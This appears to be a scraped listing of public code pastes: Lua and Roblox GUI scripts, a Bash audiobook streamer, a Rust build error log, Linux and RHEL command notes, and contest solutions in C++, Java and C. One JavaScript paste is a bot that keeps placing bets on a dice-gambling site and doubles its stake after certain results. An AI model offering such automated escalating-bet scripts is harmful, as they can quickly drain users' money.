            if v == tbl then 
                table.insert(re,string.rep(""\t"",idx)..""[""..format(i)..""] = ""..""<recursive table>\n"")
            else
                table.insert(re,table.visualize(v,idx+1))
            end
        end
    end
    return table.concat(re)
end
setreadonly(table,true)
return table.visualize"
UX2L9NZq,Replace8x8,PetersonE1,Lua,Sunday 18th of February 2024 03:09:32 PM CDT,"for i = 1, 4 do
	for i = 1, 7 do
		turtle.digDown()
		turtle.placeDown()
		turtle.forward()
	end
	turtle.digDown()
	turtle.placeDown()
	turtle.turnRight()
	turtle.dig()
	turtle.forward()
	turtle.turnRight()
	for i = 1, 7 do
		turtle.digDown()
		turtle.placeDown()
		turtle.forward()
	end
	turtle.digDown()
	turtle.placeDown()
	turtle.turnLeft()
	turtle.dig()
	turtle.forward()
	turtle.turnLeft()
end"
FAYYZnKS,Stream Audio Books in your BASH Shell,metalx1000,Bash,Sunday 18th of February 2024 03:08:42 PM CDT,"#!/bin/bash
###################################################################### 
#Copyright (C) 2024  Kris Occhipinti
#https://filmsbykris.com

#This program is free software: you can redistribute it and/or modify
#it under the terms of the GNU General Public License as published by
#the Free Software Foundation version 3 of the License.

#This program is distributed in the hope that it will be useful,
#but WITHOUT ANY WARRANTY; without even the implied warranty of
#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#GNU General Public License for more details.

#You should have received a copy of the GNU General Public License
#along with this program.  If not, see <http://www.gnu.org/licenses/>.
###################################################################### 

[[ $1 ]] && q=""$*"" || read -p ""Enter Book Title: "" q

function get_list(){                                                                                                         
  curl -s 'https://101audiobooks.net/wp-admin/admin-ajax.php' \
  --data-raw ""s=${q}&action=searchwp_live_search&swpengine=default&swpquery=${q}&origin_id=1331"" \
  --compressed|recode html..utf8
}

list=""$(get_list)""
books=""$(echo ""$list""|grep ""Listen to: ""|sed ""s/^[ \t]*//""|sed 's/Listen to: //g;s/ Audiobook //g')""

book=""$(echo ""$books""|fzf --prompt=""Select a Book: "")""
[[ $book ]] || exit

url=""$(echo ""$list""|grep -B1 ""$book""|grep http|cut -d\"" -f2|head -n1)""
[[ $url ]] || exit
echo ""$url""

mp3=""$(wget -qO- ""$url""|grep mp3|tr "">"" ""\n""|grep ""^http""|cut -d\< -f1|fzf)""
[[ $mp3 ]] || exit
mpv ""$mp3""

"
CmBDnVCW,Aiode Discord Bot - Build Compile Error (Self-Hosted),TerfyHorizon,Rust,Sunday 18th of February 2024 02:57:10 PM CDT,"[cargo-make] INFO - cargo make 0.37.9
[cargo-make] INFO - Calling cargo metadata to extract project info
[cargo-make] INFO - Cargo metadata done
[cargo-make] INFO - Project: webapp
[cargo-make] INFO - Build File: Makefile.toml
[cargo-make] INFO - Task: build
[cargo-make] INFO - Profile: development
[cargo-make] INFO - Running Task: legacy-migration
[cargo-make] INFO - Execute Command: ""cargo"" ""build""
   Compiling proc-macro2 v1.0.78
   Compiling unicode-ident v1.0.12
   Compiling wasm-bindgen-shared v0.2.91
   Compiling autocfg v1.1.0
   Compiling bumpalo v3.15.0
   Compiling serde v1.0.196
   Compiling once_cell v1.19.0
   Compiling log v0.4.20
   Compiling cfg-if v1.0.0
   Compiling serde_json v1.0.113
   Compiling ryu v1.0.16
   Compiling wasm-bindgen v0.2.91
   Compiling itoa v1.0.10
   Compiling version_check v0.9.4
   Compiling libc v0.2.153
   Compiling tinyvec_macros v0.1.1
   Compiling futures-sink v0.3.30
   Compiling tinyvec v1.6.0
   Compiling futures-core v0.3.30
   Compiling slab v0.4.9
   Compiling memchr v2.7.1
   Compiling futures-channel v0.3.30
   Compiling pin-utils v0.1.0
   Compiling version_check v0.1.5
   Compiling matches v0.1.10
   Compiling unicase v2.7.0
   Compiling futures-task v0.3.30
   Compiling pin-project-lite v0.2.13
   Compiling quote v1.0.35
   Compiling futures-io v0.3.30
   Compiling unicode-bidi v0.3.15
   Compiling dbg v1.0.4
   Compiling indexmap v1.9.3
   Compiling syn v2.0.49
   Compiling unicode-width v0.1.11
   Compiling percent-encoding v1.0.1
   Compiling pulldown-cmark v0.6.1
   Compiling getopts v0.2.21
   Compiling unicode-normalization v0.1.22
   Compiling seed v0.6.0
   Compiling time v0.1.45
   Compiling bitflags v1.3.2
   Compiling hashbrown v0.12.3
   Compiling getrandom v0.2.12
   Compiling idna v0.1.5
   Compiling enclose v1.1.8
   Compiling uuid v0.8.2
   Compiling url v1.7.2
   Compiling cookie v0.12.0
   Compiling wasm-bindgen-backend v0.2.91
   Compiling serde_derive v1.0.196
   Compiling futures-macro v0.3.30
   Compiling wasm-bindgen-macro-support v0.2.91
   Compiling wasm-bindgen-macro v0.2.91
   Compiling futures-util v0.3.30
   Compiling futures-executor v0.3.30
   Compiling futures v0.3.30
   Compiling js-sys v0.3.68
   Compiling console_error_panic_hook v0.1.7
   Compiling web-sys v0.3.68
   Compiling wasm-bindgen-futures v0.4.41
   Compiling gloo-timers v0.2.6
error[E0283]: type annotations needed for `Closure<T>`
   --> /home/terfy/.cargo/registry/src/index.crates.io-6f17d22bba15001f/seed-0.6.0/src/browser/service/routing.rs:113:9
    |
113 |     let closure = Closure::new(move |event: web_sys::Event| {
    |         ^^^^^^^   ------------ type must be known at this point
    |
    = note: cannot satisfy `_: WasmClosure`
    = help: the following types implement trait `WasmClosure`:
              (dyn Fn() -> R + 'static)
              (dyn for<'a> Fn(&'a A) -> R + 'static)
              (dyn Fn(A) -> R + 'static)
              (dyn Fn(A, B) -> R + 'static)
              (dyn Fn(A, B, C) -> R + 'static)
              (dyn Fn(A, B, C, D) -> R + 'static)
              (dyn Fn(A, B, C, D, E) -> R + 'static)
              (dyn Fn(A, B, C, D, E, F) -> R + 'static)
            and 12 others
note: required by a bound in `Closure::<T>::new`
   --> /home/terfy/.cargo/registry/src/index.crates.io-6f17d22bba15001f/wasm-bindgen-0.2.91/src/closure.rs:253:17
    |
253 |     T: ?Sized + WasmClosure,
    |                 ^^^^^^^^^^^ required by this bound in `Closure::<T>::new`
...
271 |     pub fn new<F>(t: F) -> Closure<T>
    |            --- required by a bound in this associated function
help: consider giving `closure` an explicit type, where the type for type parameter `T` is specified
    |
113 |     let closure: Closure<T> = Closure::new(move |event: web_sys::Event| {
    |                ++++++++++++

error[E0283]: type annotations needed for `Closure<T>`
   --> /home/terfy/.cargo/registry/src/index.crates.io-6f17d22bba15001f/seed-0.6.0/src/browser/service/routing.rs:113:9
    |
113 |     let closure = Closure::new(move |event: web_sys::Event| {
    |         ^^^^^^^   ------------ type must be known at this point
    |
    = note: multiple `impl`s satisfying `{closure@/home/terfy/.cargo/registry/src/index.crates.io-6f17d22bba15001f/seed-0.6.0/src/browser/service/routing.rs:113:32: 113:60}: IntoWasmClosure<_>` found in the `wasm_bindgen` crate:
            - impl<T, A, R> IntoWasmClosure<(dyn Fn(A) -> R + 'static)> for T
              where <T as FnOnce<(A,)>>::Output == R, T: 'static, T: Fn(A), A: FromWasmAbi, A: 'static, R: ReturnWasmAbi, R: 'static;
            - impl<T, A, R> IntoWasmClosure<(dyn FnMut(A) -> R + 'static)> for T
              where <T as FnOnce<(A,)>>::Output == R, T: 'static, T: FnMut(A), A: FromWasmAbi, A: 'static, R: ReturnWasmAbi, R: 'static;
note: required by a bound in `Closure::<T>::new`
   --> /home/terfy/.cargo/registry/src/index.crates.io-6f17d22bba15001f/wasm-bindgen-0.2.91/src/closure.rs:273:12
    |
271 |     pub fn new<F>(t: F) -> Closure<T>
    |            --- required by a bound in this associated function
272 |     where
273 |         F: IntoWasmClosure<T> + 'static,
    |            ^^^^^^^^^^^^^^^^^^ required by this bound in `Closure::<T>::new`
help: consider giving `closure` an explicit type, where the type for type parameter `T` is specified
    |
113 |     let closure: Closure<T> = Closure::new(move |event: web_sys::Event| {
    |                ++++++++++++

For more information about this error, try `rustc --explain E0283`.
error: could not compile `seed` (lib) due to 2 previous errors
warning: build failed, waiting for other jobs to finish...
[cargo-make] ERROR - Error while executing command, exit code: 101
[cargo-make] WARN - Build Failed.
terfy@srv667508:~/aiode/src/main/webapp$ cargo make build
[cargo-make] INFO - cargo make 0.37.9
[cargo-make] INFO - Calling cargo metadata to extract project info
[cargo-make] INFO - Cargo metadata done
[cargo-make] INFO - Project: webapp
[cargo-make] INFO - Build File: Makefile.toml
[cargo-make] INFO - Task: build
[cargo-make] INFO - Profile: development
[cargo-make] INFO - Running Task: legacy-migration
[cargo-make] INFO - Execute Command: ""cargo"" ""build""
   Compiling seed v0.6.0
error[E0283]: type annotations needed for `Closure<T>`
   --> /home/terfy/.cargo/registry/src/index.crates.io-6f17d22bba15001f/seed-0.6.0/src/browser/service/routing.rs:113:9
    |
113 |     let closure = Closure::new(move |event: web_sys::Event| {
    |         ^^^^^^^   ------------ type must be known at this point
    |
    = note: cannot satisfy `_: WasmClosure`
    = help: the following types implement trait `WasmClosure`:
              (dyn Fn() -> R + 'static)
              (dyn for<'a> Fn(&'a A) -> R + 'static)
              (dyn Fn(A) -> R + 'static)
              (dyn Fn(A, B) -> R + 'static)
              (dyn Fn(A, B, C) -> R + 'static)
              (dyn Fn(A, B, C, D) -> R + 'static)
              (dyn Fn(A, B, C, D, E) -> R + 'static)
              (dyn Fn(A, B, C, D, E, F) -> R + 'static)
            and 12 others
note: required by a bound in `Closure::<T>::new`
   --> /home/terfy/.cargo/registry/src/index.crates.io-6f17d22bba15001f/wasm-bindgen-0.2.91/src/closure.rs:253:17
    |
253 |     T: ?Sized + WasmClosure,
    |                 ^^^^^^^^^^^ required by this bound in `Closure::<T>::new`
...
271 |     pub fn new<F>(t: F) -> Closure<T>
    |            --- required by a bound in this associated function
help: consider giving `closure` an explicit type, where the type for type parameter `T` is specified
    |
113 |     let closure: Closure<T> = Closure::new(move |event: web_sys::Event| {
    |                ++++++++++++

error[E0283]: type annotations needed for `Closure<T>`
   --> /home/terfy/.cargo/registry/src/index.crates.io-6f17d22bba15001f/seed-0.6.0/src/browser/service/routing.rs:113:9
    |
113 |     let closure = Closure::new(move |event: web_sys::Event| {
    |         ^^^^^^^   ------------ type must be known at this point
    |
    = note: multiple `impl`s satisfying `{closure@/home/terfy/.cargo/registry/src/index.crates.io-6f17d22bba15001f/seed-0.6.0/src/browser/service/routing.rs:113:32: 113:60}: IntoWasmClosure<_>` found in the `wasm_bindgen` crate:
            - impl<T, A, R> IntoWasmClosure<(dyn Fn(A) -> R + 'static)> for T
              where <T as FnOnce<(A,)>>::Output == R, T: 'static, T: Fn(A), A: FromWasmAbi, A: 'static, R: ReturnWasmAbi, R: 'static;
            - impl<T, A, R> IntoWasmClosure<(dyn FnMut(A) -> R + 'static)> for T
              where <T as FnOnce<(A,)>>::Output == R, T: 'static, T: FnMut(A), A: FromWasmAbi, A: 'static, R: ReturnWasmAbi, R: 'static;
note: required by a bound in `Closure::<T>::new`
   --> /home/terfy/.cargo/registry/src/index.crates.io-6f17d22bba15001f/wasm-bindgen-0.2.91/src/closure.rs:273:12
    |
271 |     pub fn new<F>(t: F) -> Closure<T>
    |            --- required by a bound in this associated function
272 |     where
273 |         F: IntoWasmClosure<T> + 'static,
    |            ^^^^^^^^^^^^^^^^^^ required by this bound in `Closure::<T>::new`
help: consider giving `closure` an explicit type, where the type for type parameter `T` is specified
    |
113 |     let closure: Closure<T> = Closure::new(move |event: web_sys::Event| {
    |                ++++++++++++

For more information about this error, try `rustc --explain E0283`.
error: could not compile `seed` (lib) due to 2 previous errors
[cargo-make] ERROR - Error while executing command, exit code: 101
[cargo-make] WARN - Build Failed.
terfy@srv667508:~/aiode/src/main/webapp$ rustc --explain E0283                                                                                                                                                                         cargo make buildE0283
[cargo-make] INFO - cargo make 0.37.9
[cargo-make] INFO - Calling cargo metadata to extract project info
[cargo-make] INFO - Cargo metadata done
[cargo-make] INFO - Project: webapp
[cargo-make] INFO - Build File: Makefile.toml
[cargo-make] INFO - Task: build
[cargo-make] INFO - Profile: development
[cargo-make] INFO - Running Task: legacy-migration
[cargo-make] INFO - Execute Command: ""cargo"" ""build""
   Compiling seed v0.6.0
error[E0283]: type annotations needed for `Closure<T>`
   --> /home/terfy/.cargo/registry/src/index.crates.io-6f17d22bba15001f/seed-0.6.0/src/browser/service/routing.rs:113:9
    |
113 |     let closure = Closure::new(move |event: web_sys::Event| {
    |         ^^^^^^^   ------------ type must be known at this point
    |
    = note: cannot satisfy `_: WasmClosure`
    = help: the following types implement trait `WasmClosure`:
              (dyn Fn() -> R + 'static)
              (dyn for<'a> Fn(&'a A) -> R + 'static)
              (dyn Fn(A) -> R + 'static)
              (dyn Fn(A, B) -> R + 'static)
              (dyn Fn(A, B, C) -> R + 'static)
              (dyn Fn(A, B, C, D) -> R + 'static)
              (dyn Fn(A, B, C, D, E) -> R + 'static)
              (dyn Fn(A, B, C, D, E, F) -> R + 'static)
            and 12 others
note: required by a bound in `Closure::<T>::new`
   --> /home/terfy/.cargo/registry/src/index.crates.io-6f17d22bba15001f/wasm-bindgen-0.2.91/src/closure.rs:253:17
    |
253 |     T: ?Sized + WasmClosure,
    |                 ^^^^^^^^^^^ required by this bound in `Closure::<T>::new`
...
271 |     pub fn new<F>(t: F) -> Closure<T>
    |            --- required by a bound in this associated function
help: consider giving `closure` an explicit type, where the type for type parameter `T` is specified
    |
113 |     let closure: Closure<T> = Closure::new(move |event: web_sys::Event| {
    |                ++++++++++++

error[E0283]: type annotations needed for `Closure<T>`
   --> /home/terfy/.cargo/registry/src/index.crates.io-6f17d22bba15001f/seed-0.6.0/src/browser/service/routing.rs:113:9
    |
113 |     let closure = Closure::new(move |event: web_sys::Event| {
    |         ^^^^^^^   ------------ type must be known at this point
    |
    = note: multiple `impl`s satisfying `{closure@/home/terfy/.cargo/registry/src/index.crates.io-6f17d22bba15001f/seed-0.6.0/src/browser/service/routing.rs:113:32: 113:60}: IntoWasmClosure<_>` found in the `wasm_bindgen` crate:
            - impl<T, A, R> IntoWasmClosure<(dyn Fn(A) -> R + 'static)> for T
              where <T as FnOnce<(A,)>>::Output == R, T: 'static, T: Fn(A), A: FromWasmAbi, A: 'static, R: ReturnWasmAbi, R: 'static;
            - impl<T, A, R> IntoWasmClosure<(dyn FnMut(A) -> R + 'static)> for T
              where <T as FnOnce<(A,)>>::Output == R, T: 'static, T: FnMut(A), A: FromWasmAbi, A: 'static, R: ReturnWasmAbi, R: 'static;
note: required by a bound in `Closure::<T>::new`
   --> /home/terfy/.cargo/registry/src/index.crates.io-6f17d22bba15001f/wasm-bindgen-0.2.91/src/closure.rs:273:12
    |
271 |     pub fn new<F>(t: F) -> Closure<T>
    |            --- required by a bound in this associated function
272 |     where
273 |         F: IntoWasmClosure<T> + 'static,
    |            ^^^^^^^^^^^^^^^^^^ required by this bound in `Closure::<T>::new`
help: consider giving `closure` an explicit type, where the type for type parameter `T` is specified
    |
113 |     let closure: Closure<T> = Closure::new(move |event: web_sys::Event| {
    |                ++++++++++++

For more information about this error, try `rustc --explain E0283`.
error: could not compile `seed` (lib) due to 2 previous errors
[cargo-make] ERROR - Error while executing command, exit code: 101
[cargo-make] WARN - Build Failed.
"
NusnnY8a,Common Linux Commands,Wrigs,Bash,Sunday 18th of February 2024 02:38:52 PM CDT,"# Add a user
# Basic usage: useradd [options] username
sudo useradd -s /bin/bash -m -c ""Fname Lname"" -Gwheel <username>

# Set a password for new user:
sudo passwd <username>

# Set to prompt user to change password at login:
sudo passwd --expire <username>

# Add a User to Multiple Groups
sudo groupadd admins
sudo groupadd webadmin
sudo groupadd developers
sudo usermod -a -G admins,webadmin,developers <username>
sudo useradd -G admins,webadmin,developers <username>

# Add user to a group
# groupadd - add current user to a group
sudo groupadd <newgroup>
# usermod - add specified user to a group
usermod -a -G <examplegroup> <username>

# File and Directory managment
ls         # List directory contents
ls -a      # Do not ignore entries starting with .
ls -h      # List file sizes in human-readable format
ls -l      # Use long listing format
ls -lha    # May combine switches
pwd        # Print working directory
cd         # Change current directory
mkdir      # Create a new directory
rm         # Remove files or directories
rm -rf     # Remove directory and all contents/subfolders
cp         # Copy files and folders
mv         # Move files and folders

# File Content Managment
cat        # Concatenate and display file contents
less       # View file contents one page at a time
head       # View the first part of files
tail       # View the last part of files

# User and Permissions Managment
sudo       # Execute a command as a superuser
passwd     # Change user password
chmod      # Change the permissions of files and folders

# Process Managment
ps         # Report a shapshot of the corrent processes
kill       # Kill a process - need PID (process ID)

# System Information
uname     # Display system information, -a for all information
df        # Display file system disk space usage
free      # Display amount of free and used memory in the system

# Network Managment
ping      # Test network connectivity
ifconfig  # Configure network interface parameters
hostname -I # Show IP address
ip addr   # Display IP address of NICs"
cuRSeGFY,Untitled,Sreekar_0125,C++,Sunday 18th of February 2024 02:31:31 PM CDT,"#include <bits/stdc++.h>
#include <ext/pb_ds/assoc_container.hpp>
#include <ext/pb_ds/tree_policy.hpp>
using namespace std;
using namespace __gnu_pbds;
template <class T>
using pbds =
    tree<T, null_type, less<T>, rb_tree_tag, tree_order_statistics_node_update>;
// #define cerr if(false)cerr
#define int long long
#define pb push_back
#define F first
#define S second
#define yes cout << ""Yes\n""
#define no cout << ""No\n""
#define yn(x) x ? yes : no
#define f(i, s, e) for (int i = s; i < e; i++)
#define vi vector<int>
#define vb vector<bool>
#define pii pair<int, int>
#define vpi vector<pii>
#define umi unordered_map<int, int>
#define mi map<int, int>
#define si set<int>
#define sc set<char>
#define maxheap priority_queue<int>
#define minheap priority_queue<int, vector<int>, greater<int>>
#define all(x) x.begin(), x.end()
#define minele(x) *min_element(all(x))
#define maxele(x) *max_element(all(x))
#define endl '\n'

const int N = 2e5;
const int MOD = 1e9 + 7;

#ifndef ONLINE_JUDGE
#define debug(x)            \
    cerr << (#x) << "" is ""; \
    _print(x)
#define dbg(x) \
    cerr << (#x) << "" is "" << x << endl;
#else
#define debug(x)
#define dbg(x)
#endif

template <typename T>
void _print(T a)
{
    cerr << a;
}
template <typename T>
void print(T a)
{
    cout << a << ' ';
}
template <typename T>
void println(T a)
{
    cout << a << endl;
}
template <class T>
istream &operator>>(istream &is, vector<T> &a)
{
    for (auto &x : a)
        is >> x;
    return is;
}
template <class T>
ostream &operator<<(ostream &os, const vector<T> &a)
{
    for (const auto &x : a)
        os << x << ' ';
    return os;
}

template <class T, class V>
void _print(pair<T, V> p);
template <class T>
void _print(vector<T> v);
template <class T>
void _print(set<T> v);
template <class T, class V>
void _print(map<T, V> v);
template <class T>
void _print(multiset<T> v);
template <class T, class V>
void _print(pair<T, V> p)
{
    cerr << ""{"";
    _print(p.F);
    cerr << "","";
    _print(p.S);
    cerr << ""} "";
}
template <class T>
void _print(vector<T> v)
{
    cerr << ""[ "";
    for (T i : v)
    {
        _print(i);
        cerr << "" "";
    }
    cerr << ""]"";
    cerr << endl;
}
template <class T>
void _print(set<T> v)
{
    cerr << ""[ "";
    for (T i : v)
    {
        _print(i);
        cerr << "" "";
    }
    cerr << ""]"";
    cerr << endl;
}
template <class T>
void _print(multiset<T> v)
{
    cerr << ""[ "";
    for (T i : v)
    {
        _print(i);
        cerr << "" "";
    }
    cerr << ""]"";
    cerr << endl;
}
template <class T, class V>
void _print(map<T, V> v)
{
    cerr << ""[ "";
    for (auto i : v)
    {
        _print(i);
        cerr << "" "";
    }
    cerr << ""]"";
    cerr << endl;
}
template <class T, class V>
void _print(unordered_map<T, V> v)
{
    cerr << ""[ "";
    for (auto i : v)
    {
        _print(i);
        cerr << "" "";
    }
    cerr << ""]"";
    cerr << endl;
}

/////////////Sieve///////////////
// vb sieve(N + 5, true);
// vi primes;
// void gensieve()
// {
//     sieve[0] = sieve[1] = false;
//     for (int i = 2; i <= sqrt(N); i++)
//     {
//         if (sieve[i])
//         {
//             for (int j = i * i; j <= N; j += i)
//                 sieve[j] = false;
//         }
//     }
//     for (int i = 2; i <= N; i++)
//     {
//         if (sieve[i])
//             primes.pb(i);
//     }
// }
////////////////////////////////

int binpow(int a, int b)
{
    int ans = 1;
    a %= MOD;
    while (b)
    {
        if (b & 1)
            ans = ((ans % MOD) * (a % MOD)) % MOD;

        a = ((a % MOD) * (a % MOD)) % MOD;
        b >>= 1;
    }
    return ans;
}

void fast()
{
    ios_base::sync_with_stdio(false);
    cin.tie(NULL);
    cout.tie(NULL);
}

void init_code()
{
#ifndef ONLINE_JUDGE
    freopen(""input.txt"", ""r"", stdin);
    freopen(""output.txt"", ""w"", stdout);
    freopen(""error.txt"", ""w"", stderr);
#endif // ONLINE_JUDGE
}

int n, c;
vi v;

vector<vi> dp;

int fun(int i, int p)
{
    if (dp[i][p] != -1)
        return dp[i][p];
    if (i == n - 1)
    {
        return dp[i][p] = (((v[i] - v[p]) * (v[i] - v[p])) + c);
    }
    // take
    int take = (((v[i] - v[p]) * (v[i] - v[p])) + c) + fun(i + 1, i);

    // not take
    int nottake = fun(i + 1, p);

    return dp[i][p] = min(take, nottake);
}

void solve()
{
    cin >> n >> c;

    v.resize(n);
    cin >> v;

    dp.resize(n + 1, vi(n + 1, -1));
    println(fun(0, 0));
}

signed main()
{
    init_code();
    fast();
    int t = 1;
    // cin >> t;
    while (t--)
    {
        solve();
    }
    return 0;
}
"
tzKFWGKB,pls,nmh07000,Java,Sunday 18th of February 2024 02:16:01 PM CDT,"import java.util.*;

public class pls {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);
        int N = scanner.nextInt();
        int M = scanner.nextInt();
        scanner.nextLine(); // Consume newline
        String directions = scanner.nextLine();
        int[] max = new int[N];
        int[] milk = new int[N];
        for (int i = 0; i < N; i++) {
            milk[i] = scanner.nextInt();
            max[i] = milk[i];
        }
        Set<List<Integer>> repeat = new HashSet<>();
        for (int i = 0; i < M; i++) {
            List<Integer> curr = new ArrayList<>(Collections.nCopies(N, 0));
            for (int j = 0; j < N; j++) {
                if (milk[j] == 0) {
                    continue;
                }
                if (directions.charAt(j) == 'L') {
                    if (j == 0) {
                        curr.set(N - 1, curr.get(N - 1) + 1);
                    } else {
                        curr.set(j - 1, curr.get(j - 1) + 1);
                    }
                    curr.set(j, curr.get(j) - 1);
                } else {
                    if (j == N - 1) {
                        curr.set(0, curr.get(0) + 1);
                    } else {
                        curr.set(j + 1, curr.get(j + 1) + 1);
                    }
                    curr.set(j, curr.get(j) - 1);
                }
            }
            for (int j = 0; j < N; j++) {
                milk[j] += curr.get(j);
                if (milk[j] > max[j]) {
                    milk[j] = max[j];
                }
            }
            if (!repeat.contains(Arrays.asList(milk))) {
                repeat.add(Arrays.asList(Arrays.copyOf(milk, milk.length)));
            } else {
                break;
            }
        }
        int output = 0;
        for (int i = 0; i < N; i++) {
            output += milk[i];
        }
        System.out.println(output);
    }
}"
rDRy9sM6,snowzy bot supersnowzy strikes back,coinwalk,JavaScript,Sunday 18th of February 2024 02:05:58 PM CDT,"var original = parseFloat(document.getElementById('pct_balance').value);
var dockiez = original;
var base = Number((original/1000).toFixed(8));
var tens = (base*10);
var sevens = (base*6.9);
var eights = (base*7.9);
var tiffy = 0;
var snowy = base;
var bilance = original;
var good = (((bilance-original)*1).toFixed(8));
 
function dobet(){
bilance = document.getElementById('pct_balance').value;
good = (((bilance-original)*1).toFixed(8));
console.log(""profit"");
console.log(good);
    if ((bilance>(((Math.floor(bilance/tens))*tens)+sevens))&&(bilance<(((Math.floor(bilance/tens))*tens)+eights))&&(bilance!=tiffy)){
        snowy = snowy*2;
        tiffy = parseFloat(bilance);
    }
    if ((snowy>=tens)&&(bilance>dockiez)){
        snowy = base;
        tiffy = 0;
        dockiez = parseFloat(bilance);
    }
    if (((bilance-(snowy*100))<=(base*200))&&(bilance<dockiez)){
        snowy = base;
        tiffy = 0;
        dockiez = parseFloat(bilance);
    }
    if (bilance<base) {
        console.log(""busted"");     
        return;
    }
    if (bilance>=150000) {
       console.log(""winner winner chicken dinner"");
       return;
   }
$('#pct_chance').val(49.5);
$('#pct_bet').val(((snowy*1).toFixed(8)));
$('#a_lo').click();
setTimeout(() => dobet(), 350)
} 
dobet();
"
NtKu4mUq,Basic C Program to get user input and add numbers together,metalx1000,C,Sunday 18th of February 2024 01:53:59 PM CDT,"#include <stdio.h>

int add();

int main(){
  printf(""Welcome.\n"");

  int age = 23;
  float money = 2.50;
  char name[] = ""User"";

  printf(""Hello %s,\n"", name);
  printf(""You are %d years old.\n"", age);
  printf(""You have $%.2f.\n\n"", money);
  add();
  return 0;
}

int add(){

  float A;
  float B;
  float C;

  printf(""Enter a number: "");
  scanf(""%f"", &A);

  printf(""Enter another number: "");
  scanf(""%f"", &B);

  C = A + B;

  printf(""Total: %f\n"", C);


  return 0;
}
"
nVga2End,RHEL Repos,Wrigs,Bash,Sunday 18th of February 2024 01:53:42 PM CDT,"# The EPEL repository can be added to RHEL 9 with the following command:

sudo dnf install https://dl.fedoraproject.org/pub/epel/epel-release-latest-9.noarch.rpm

# Install RPM Fusion Repository in Linux

sudo dnf install --nogpgcheck https://mirrors.rpmfusion.org/free/el/rpmfusion-free-release-$(rpm -E %rhel).noarch.rpm https://mirrors.rpmfusion.org/nonfree/el/rpmfusion-nonfree-release-$(rpm -E %rhel).noarch.rpm

# RHEL users might be required to execute the following additional step:
sudo subscription-manager repos --enable codeready-builder-for-rhel-9-$(arch)-rpms

# Verify RPM Fusion Repository in Linux
sudo dnf upgrade
dnf repolist

# Now list free and nonfree package lists of rpm fusion:
dnf repository-packages rpmfusion-free-updates list
dnf repository-packages rpmfusion-nonfree-updates list

# Enable repositories:
sudo dnf config-manager --set-enabled <repo name>

"
ehMEyh7h,palindrome,nmh07000,Java,Sunday 18th of February 2024 01:44:04 PM CDT,"import java.util.*;
public class palindrome {
    
    static boolean isPalindrome(long n) {
        String str = String.valueOf(n);
        return str.equals(new StringBuilder(str).reverse().toString());
    }
    public static void main(String[] args) {
        Scanner scan = new Scanner(System.in);
        int n = scan.nextInt();
        for(int j=0; j<n; j++) {
            int turns = 0;
            long s = scan.nextLong();
            int i = 1;
            while(s!=0 && s > -1){
                i = 1;
                if(isPalindrome(i) && (!isPalindrome(s-i) || s-i==0)) {
                    s -= i;
                    turns++;
                }
                else if (isPalindrome(s-i)) {
                    while(isPalindrome(s-i)) {
                        i++;
                    }
                }
            }
            if(turns % 2 == 0) {
                System.out.println(""E"");
            }
            else {
                System.out.println(""B"");
            }
        }
    }
}"
NWi6cdfZ,fixed_convert_2,Clickady,Lua,Sunday 18th of February 2024 01:41:09 PM CDT,"-- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new(""ScreenGui"")
local Frame = Instance.new(""Frame"")
local Frame_2 = Instance.new(""Frame"")
local Title = Instance.new(""TextLabel"")
local Burger = Instance.new(""TextButton"")
local UICorner = Instance.new(""UICorner"")
local Title_2 = Instance.new(""TextLabel"")
local RobloxOofSound = Instance.new(""TextButton"")
local UICorner_2 = Instance.new(""UICorner"")
local Gunshot = Instance.new(""TextButton"")
local UICorner_3 = Instance.new(""UICorner"")
local Hitmarker = Instance.new(""TextButton"")
local UICorner_4 = Instance.new(""UICorner"")
local Fart = Instance.new(""TextButton"")
local UICorner_5 = Instance.new(""UICorner"")

--Properties:

ScreenGui.Parent = game.StarterGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = ScreenGui
Frame.AnchorPoint = Vector2.new(0.5, 0.5)
Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0.581352651, 0, 0.190701976, 0)
Frame.Size = UDim2.new(0, 767, 0, 30)

Frame_2.Parent = Frame
Frame_2.AnchorPoint = Vector2.new(0.5, 0.5)
Frame_2.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
Frame_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame_2.BorderSizePixel = 0
Frame_2.Position = UDim2.new(0.500255108, 0, 10.0659294, 0)
Frame_2.Size = UDim2.new(0, 766, 0, 544)

Title.Name = ""Title""
Title.Parent = Frame
Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Title.BackgroundTransparency = 1.000
Title.BorderColor3 = Color3.fromRGB(0, 0, 0)
Title.BorderSizePixel = 0
Title.Position = UDim2.new(0.0299867243, 0, 0.100000001, 0)
Title.Size = UDim2.new(0, 720, 0, 27)
Title.Font = Enum.Font.Gotham
Title.Text = ""Voice Mod""
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 14.000

Burger.Name = ""Burger""
Burger.Parent = Frame
Burger.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Burger.BorderColor3 = Color3.fromRGB(0, 0, 0)
Burger.BorderSizePixel = 0
Burger.Position = UDim2.new(0.0286831819, 0, 4.51904726, 0)
Burger.Size = UDim2.new(0, 200, 0, 50)
Burger.Font = Enum.Font.Gotham
Burger.Text = ""Burger King""
Burger.TextColor3 = Color3.fromRGB(255, 255, 255)
Burger.TextSize = 14.000

UICorner.Parent = Burger

Title_2.Name = ""Title""
Title_2.Parent = Frame
Title_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Title_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Title_2.BorderSizePixel = 0
Title_2.Position = UDim2.new(0.0299867243, 0, 2.33333325, 0)
Title_2.Size = UDim2.new(0, 720, 0, 27)
Title_2.Font = Enum.Font.Gotham
Title_2.Text = ""Sound""
Title_2.TextColor3 = Color3.fromRGB(255, 255, 255)
Title_2.TextSize = 14.000

RobloxOofSound.Name = ""Roblox Oof Sound""
RobloxOofSound.Parent = Frame
RobloxOofSound.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
RobloxOofSound.BorderColor3 = Color3.fromRGB(0, 0, 0)
RobloxOofSound.BorderSizePixel = 0
RobloxOofSound.Position = UDim2.new(0.0286831819, 0, 7.21904707, 0)
